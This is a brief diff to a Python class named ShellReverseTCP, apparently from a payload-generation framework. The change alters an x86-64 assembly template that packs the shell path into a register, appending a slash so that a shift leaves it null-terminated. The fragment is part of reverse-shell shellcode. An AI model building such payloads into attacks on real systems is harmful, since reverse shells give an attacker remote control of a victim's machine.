@@ -89,7 +89,7 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             mov rax, r8
 
             xor rdx, rdx
-            mov r13, 0x{shell.hex()}
+            mov r13, 0x{(shell+'/').hex()}
             shr r13, 8
             push r13
             mov rdi, rsp
